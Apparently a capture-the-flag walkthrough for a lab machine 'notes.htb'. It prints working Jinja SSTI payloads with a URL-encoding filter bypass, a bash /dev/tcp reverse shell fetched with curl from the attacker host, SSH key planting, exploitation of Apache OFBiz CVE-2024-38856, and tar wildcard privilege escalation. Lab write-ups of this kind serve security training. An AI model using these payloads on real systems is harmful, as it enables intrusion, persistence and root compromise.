# Writeup
# Enumeration
##Nmap Scan
```
 nmap 10.10.14.14 -p- -sC -sV -A --min-rate=1000 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-19 19:52 EDT
Nmap scan report for 192.168.147.138
Host is up (0.00039s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c8:6b:ba:9b:dd:eb:00:8b:9c:44:93:ed:f8:b2:0c:90 (ECDSA)
|_  256 c0:07:4a:0e:97:22:bf:1e:1d:dd:c2:b8:d1:af:e1:00 (ED25519)
80/tcp    open  http       nginx 1.24.0 (Ubuntu)
|_http-title: Welcome to notes.htb!
|_http-server-header: nginx/1.24.0 (Ubuntu)
36385/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.34 seconds
```
We can see that ports 22 and 80 are both open. Let’s take a look at port 80 and see what it’s hosting.
 
The message on the page says `Welcome to notes.htb` taking notice of the domain, so let’s add this to /etc/hosts file.
```
 echo "10.10.14.14 notes.htb" | sudo tee -a /etc/hosts
```
Other than the domain name, there is nothing more useful here. Let’s see if we can locate any directories and uncover a site or application.
``` 
ffuf -u http://notes.htb/FUZZ -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
 
Nothing. Since we made no progress there, let’s look for possible subdomains that may be online. Using `ffuf`, execute a subdomain enumeration on the `notes.htb` domain.
``` 
ffuf -u http://notes.htb/ -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.notes.htb" -fw 55
```
 
Great! We found a subdomain `web18301`. Let’s add this to the /etc/hosts file.
``` 
echo "10.10.14.14 web18301.notes.htb" | sudo tee -a /etc/hosts
```
Viewing the site, we see we have a login form and a forgot password link. Since we don’t have login credentials, we try default passwords with no luck. 
 
After a bit of poking at the form we try to input some single quotes into the `email` and `password` field to test for error messages but no luck. I also tried some NoSQL Auth bypasses, but those also failed.
 
I decided it’d be a good idea to take a closer look at this page and view the source code. In the source, we can see that a navigation link has been commented out for the signup form.
 
Let’s take a look at that link and see if we can sign up.
 
All we have is a blank page with the login link. This is not helpful. Let’s open up Burp Suite and poke at this endpoint some more. To get started, let’s just make a basic GET request to the endpoint. Capture the sign-up request in Burp Suite, then send it to Repeater for manipulation. When making the GET request, we can see that we just get the blank page as expected.
 
This time, let’s switch to a `POST` request and see how the endpoint responds. In Burp Suite, right-click in the Responder window and select Change request method.
 
This will switch the request from a `GET` to a `POST`. Let’s send off the request and see how the endpoint responds.
 
We see the endpoint responds with `Missing CSRF token`. This is good, it’s telling us what it wants, so let’s see if the login form has a CSRF token we can steal.
 
Sure enough, there is a CSRF token named `csrf_token`. Let’s grab it and submit it to the sign-up endpoint and see what happens next.
 
This time we got the text `Missing email`. Let’s add an `email` parameter and a `password` parameter and see if it will create a new account.
 
It did not create a new account. Instead, it’s asking for a `firstname`. Let’s include the `firstname` parameter.
 
We still don’t have all the values. Now it’s asking for a `lastname`, let’s supply it.
 
Now it’s asking for `password1`, let’s rename `password` to `password1` and try again.
 
We still don’t have it. It’s asking for `password2`, which is probably for the confirmation of the password. Let’s add the `password2` parameter and ensure it’s the same value as `password1`. Finally, once we have that, let’s send the request.
 
Ah, ha! This time, we get a `302 redirect`, and if we follow it, it takes us back to the login page. It would appear that our account was created. Let’s visit the login page and attempt to log in.
 
This appears to be some sort of note-taking application. You can add new notes, delete notes, and when you click on a note, the note is base64 encoded.
 


# Foothold
After attempting various injection vulnerabilities, I eventually attempted an SSTI injection. When doing so, I received the following message.
 
The message says, `Malicious characters detected!`. This is a good sign, and they are specifically filtering for these characters, which means we’re likely on the right track. Now to see if there is any sort of bypass. Let’s try encoding the data, but how so? Let’s try HTML encoding the data and see what happens.
Using Burp Suite Decoder, convert the payload of `{{ 7*7 }}` to HTML encoding.
 
We added the HTML-encoded data to a note, but unfortunately, it does not appear that the data was decoded. 
 
We just have our HTML-encoded payload. Let’s see what happens when we click on it for good measure.
 
Ahh! Something interesting happened. Our HTML-encoded payload was converted to plain text. Let’s take a look at the base64 encoded data to see what it contains. Use Burp Suite Decoder to decode the base64-encoded data.
 
Hmm, it’s just the HTML-encoded payload. Clearly, there was no SSTI taking place, but this was interesting. Let’s try another encoded payload. This time, let’s URL-encode the data. In Burp Suite Decoder, encode the payload `{{ 7*7 }}` using URL encoding.
 
Now, let’s create a new note with this payload and see what happens.
```
 %7b%7b%20%37%2a%37%20%7d%7d
```
 
So far, nothing exciting. It’s just our URL-encoded payload. Let’s click on it and see if anything happens to the payload.
 
Bingo, we have `49`! We bypassed the character restriction by URL encoding the note and our payload `{{ 7*7 }}` was executed. When the base64 encoding takes place, the note appears to be URL decoded, and the template injection happens. Now let’s get a reverse shell. Searching the web for SSTI payloads brings us to PayLoadAllTheThings where we find the following payload.
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```
Let’s URL encode this using Burp Suite, add a new note to the application, then execute the base64 encode function to achieve code execution.
```
%7b%7b%63%6f%6e%66%69%67%2e%5f%5f%63%6c%61%73%73%5f%5f%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%6f%73%27%5d%2e%70%6f%70%65%6e%28%27%69%64%27%29%2e%72%65%61%64%28%29%7d%7d
```
 
Sure enough, we have code execution and can see the app is operating as the user `notes`. Now, let’s grab a reverse shell. To do so, we’ll host a bash script that will be downloaded and launched. First, create your reverse shell bash script.
```
echo “bash -c 'bash -i >& /dev/tcp/10.10.14.14/4444 0>&1'”>shell.sh
```
Now, launch an HTTP server using Python to serve the `shell.sh` file.
```
python3 -m http.server
```
 
You’ll also need to start a netcat listener to capture the reverse shell.
```
nc -lvnp 4444
```
 
Now, we need to create our payload that downloads our shell script and then passes it to bash to be executed. We can do that like so.
```
{{config.__class__.__init__.__globals__['os'].popen('curl 10.10.14.14:8000/shell.sh | bash').read()}}
```
URL encode the payload using Burp Suite Decoder.
```
%7b%7b%63%6f%6e%66%69%67%2e%5f%5f%63%6c%61%73%73%5f%5f%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%6f%73%27%5d%2e%70%6f%70%65%6e%28%27%63%75%72%6c%20%31%30%2e%31%30%2e%31%34%2e%31%34%3a%38%30%30%30%2f%73%68%65%6c%6c%2e%73%68%20%7c%20%62%61%73%68%27%29%2e%72%65%61%64%28%29%7d%7d
```
 
Add this new payload as a note, and then to execute it, click on it so it gets base64 encoded, which will execute the injection.
We see that the bash `shell.sh` script was downloaded.
 
And, finally, we capture the reverse shell.
 
Let’s execute a few commands to get a proper shell.
```
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
Ctrl+Z
stty raw -echo
fg
Enter Twice
```
# Lateral Movement (optional)
Let’s change to the user's home directory and see what files we have.
 
Nothing really jumps out. Let’s see what network services are listening.
```
netstat -ant |grep LISTEN
```
We can see there are a few services running locally.
 
The ones that jump out to me are `127.0.0.1:8080` and `127.0.0.1:8443`. Let’s forward these locally so we can see what they are hosting. However, before we do this, we need to be able to connect over SSH, so let’s add our public key to the `authorized_hosts` for the `notes` user. On your attack machine, generate a new key if you don’t have one already.
```
ssh-keygen
cat ~/.ssh/id_ed25519.pub
```
 
Now, in the reverse shell, browse to the home directory and create the directory `.ssh` and place your key in the `authorized_keys` file.
```
cd
mkdir .ssh
cd .ssh
echo “ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPC4w1pdE9G1xHj0zR1POpPDi5HqSEY94zDQUJNSRStu pac@kali” >> authorized_keys
```
Now you can SSH into `notes.htb` with your public key.
```
ssh notes@notes.htb
```
 
Now that we can SSH into `notes.htb`, let’s forward one of the local ports to our machine so we can see what it’s hosting. Let’s start with the service running on 8443
``` 
ssh -L 8443:127.0.0.1:8443 notes@notes.htb
```
Browsing to the local site at `https://127.0.0.1:8443`, we see that we get a 404 Not Found error message. We also see the server is running Apache Tomcat 9.0.86.
 
Let’s look for some files or directories by performing a dictionary attack on this endpoint using `ffuf`.
```
ffuf -u https://127.0.0.1:8443 -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt
```
 
This returned a `302` hit for the file `content/debug.log`. Let’s try to view it. Upon loading the link, we are redirected to a login page.
 
In the bottom right corner of the page, it says `Powered by Apache OFBiz. Release 18.12`. After doing some searching for CVEs for `Apache OFBiz`, you eventually come across the following CVE-2024-38856. Doing more googling on the specific CVE and github and you’ll eventually find the following page with a POC. Let’s download the repo and try out the exploit.
```
git clone https://github.com/securelayer7/CVE-2024-38856_Scanner.git
```
Once the repo is downloaded, install the required modules.
```
pip3 install -r requirements.txt
```
Now let’s see if the remote service is vulnerable
```
 python3 cve-2024-38856_Scanner.py -t https://127.0.0.1 -p 8443
```
Running the command, we get output that states the remote service is vulnerable to command execution. 
 
This time, let’s run the `id` command and see who the service is running as.
``` 
python3 cve-2024-38856_Scanner.py -t https://127.0.0.1 -p 8443 -c 'id' –exploit
```
We successfully achieved command execution and discovered the application is running as the user `ofbiz`.
 
Now that we have command execution, let’s get a reverse shell. Once more, let’s fire up our Python web server to host `shell.sh`.
```
python3 -m http.server
```
Next, we need to set up a `netcat` listener to catch the reverse shell.
```
nc -lvnp 4444
```
And finally, we execute the exploit once again using a `curl` command.
``` 
python3 cve-2024-38856_Scanner.py -t https://127.0.0.1 -p 8443 -c 'curl 10.10.14.14:8000/shell.sh | bash' –exploit
```
 
We successfully captured a reverse shell as the `ofbiz` user. To get a good shell, I’m going to copy my public key into the `authorized_keys` file for the `ofbiz` user.
```
cd
mkdir .ssh
cd .ssh
echo “ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPC4w1pdE9G1xHj0zR1POpPDi5HqSEY94zDQUJNSRStu pac@kali” >> authorized_keys
```
Once that’s complete, you can now SSH to `notes.htb` as the `ofbiz` user.
```
ssh ofbiz@notes.htb
```
 
Now you can navigate to the user’s home directory and view the contents of `user.txt`.
 
To get a good idea of what’s going on in the background, let’s use the `pspy` tool. Here we can see that a cron job of `/usr/bin/backup-ofbiz` is run every so often. 
 
Taking a closer look at the file, we see that we have a BASH script.
``` 
#!/bin/bash

set -e  # Exit on error
set -o pipefail

THEMES_DIR="/opt/ofbiz/themes"
CONFIG_DIR="/opt/ofbiz/config"
PLUGINS_DIR="/opt/ofbiz/plugins"
BACKUP_DIR="/backup"

echo "[+] Starting OFBiz Backup..."

# Ensure required directories exist
for dir in "$THEMES_DIR" "$CONFIG_DIR" "$PLUGINS_DIR" "$BACKUP_DIR"; do
    if [[ ! -d "$dir" ]]; then
        echo "[!] ERROR: Directory $dir does not exist." >&2
        exit 1
    fi
done

# Backup Themes
echo "[+] Backing up themes..."
tar -zcf "$BACKUP_DIR/ofbiz.themes.tgz" -C "$THEMES_DIR" . || {
    echo "[!] Failed to back up themes." >&2
    exit 1
}

# Backup Configs
echo "[+] Backing up configs..."
tar -zcf "$BACKUP_DIR/ofbiz.configs.tgz" -C "$CONFIG_DIR" . || {
    echo "[!] Failed to back up configs." >&2
    exit 1
}

# Backup Plugins
echo "[+] Backing up plugins..."
cd /opt/ofbiz/plugins
if [ -d "$PLUGINS_DIR" ] && [ "$(ls -A "$PLUGINS_DIR")" ]; then
        tar -zcf "$BACKUP_DIR/ofbiz.plugins.tgz" "$PLUGINS_DIR" * . || {
        echo "[!] Failed to back up plugins." >&2
        exit 1
}
fi
# Final combined backup
echo "[+] Creating master backup archive..."
cd "$BACKUP_DIR"
tar -zcf backup-ofbiz.tgz ofbiz.themes.tgz ofbiz.configs.tgz ofbiz.plugins.tgz || {
    echo "[!] Failed to create master backup archive." >&2
    exit 1
}

# Clean up temp tgz files
rm -f ofbiz.themes.tgz ofbiz.configs.tgz ofbiz.plugins.tgz
echo "[+] Backup complete and stored at $BACKUP_DIR/backup-ofbiz.tgz"
```
It’s a backup script for `Apache OFBiz` that performs a backup of the `/opt/ofbiz/themes`, `/opt/ofbiz/config`, `/opt/ofbiz/plugins` directories using the `tar` command and stores the result in the `/backup` directory. If you are doing some research, you might perform a search on `privilege escalation with tar` and find the following blog post. Taking a look back at the backup script, we can see that the `plugins` tar command is susceptible to a wildcard attack. This means our attack will take place in the `/opt/ofbiz/plugins/` directory. Before we execute our attack, we must first create the shell script that will be executed. Let’s create that now.
```
echo “cat /root/root.txt > /root.txt” > shell.sh
```
Now make the file executable:
```
chmod +x shell.sh
```
Now, for the exploit to take place, we must create two empty files. One named `'--checkpoint=1'` and another named `'--checkpoint-action=exec=sh shell.sh'`, notice how we reference the `shell.sh` file in the file name. 
```
 echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh shell.sh'
```
We now have three files in the `plugins` directory.
 
Once the backup script runs, it will concatenate each file as an argument to the tar command, where `‘--checkpoint=1’` and `‘—checkpoint-action=exec=sh shell.sh’` are arguments that tell `tar` to execute the `shell.sh` script. If everything was successful, just wait for the script to run, then check the `/root.txt` file for the root flag.
